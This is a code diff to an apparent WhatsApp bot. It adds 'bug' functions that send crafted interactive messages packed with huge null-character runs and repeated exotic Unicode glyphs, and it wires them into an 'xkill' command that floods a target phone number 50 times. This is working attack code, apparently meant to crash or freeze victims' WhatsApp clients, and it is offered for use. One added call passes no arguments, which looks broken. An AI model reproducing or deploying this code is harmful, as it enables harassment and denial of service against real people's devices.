@@ -722,6 +722,82 @@ async function galx(target, Ptcp = true) {
 		}; 
 
 
+async function coresix(target, text, amount, ptcp = false) {
+    await XeonBotInc.relayMessage(target, 
+        {
+            viewOnceMessage: {
+                message: {
+                    interactiveResponseMessage: {
+                        body: {
+                            text: text,
+                            format: "EXTENSIONS_1"
+                        },
+                        nativeFlowResponseMessage: {
+                            name: 'galaxy_message',
+                            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"XBUG5♱𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(amount)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
+                            version: 3
+                        }
+                    }
+                }
+            }
+        }, 
+        ptcp ? { participant: { jid: target } } : {}
+    );
+};
+
+
+
+    const keyy = {
+      remoteJid: 'p',                                            
+      fromMe: false,
+      participant: "0@s.whatsapp.net"
+    };
+
+    const bodyy = {
+      text: "XBUG5𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭♱",                                              
+      format: "DEFAULT"
+    };
+
+const betaq = {
+      'key': keyy,
+      'message': {
+        'interactiveResponseMessage': {
+          'body': bodyy,
+          'nativeFlowResponseMessage': {
+            'name': "galaxy_message",
+            'paramsJson': "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"XBUG5\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"ttech-web-server.onrender.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "".repeat(500000) + "\",\"screen_0_TextInput_1\":\"onexbug\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
+            'version': 0x3
+          }
+        }
+      }
+    };
+
+async function beta(quote, target) {
+  for (let i = 0; i < 10; i++) {
+    await XeonBotInc.relayMessage(target, {
+      'viewOnceMessage': {
+        'message': {
+          'interactiveResponseMessage': {
+            'body': {
+              'text': "XBUG5𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭♱",
+              'format': "EXTENSIONS_1"
+            },
+            'nativeFlowResponseMessage': {
+              'name': "galaxy_message",
+              'paramsJson': "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AdvanceBug\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"ttech-web-server.onrender.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "\0".repeat(0xf9060) + "\",\"screen_0_TextInput_1\":\"\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
+              'version': 0x3
+            }
+          }
+        }
+      }
+    }, {
+      'participant': {
+        'jid': target
+      }
+    });
+  }
+}; 
+	
         switch (command) {
 
 case 'xkill': {
@@ -731,9 +807,13 @@ let target = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net"
 await loading()
 for (let i = 0; i < 50; i++) {
 await PayMent(target)
+await beta(betaq, target)
 await caros(target, Ptcp = true)
 await galx(target, Ptcp = true)
 await dott(target)
+await coresix()
+await XeonBotInc.sendMessage(target, { text: `XBUG5𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭♱` }, {quoted: xbug2})
+await sleep(20000)
 }
 replygcxeon(`Successfully Sent Bug To ${target}`)
 }
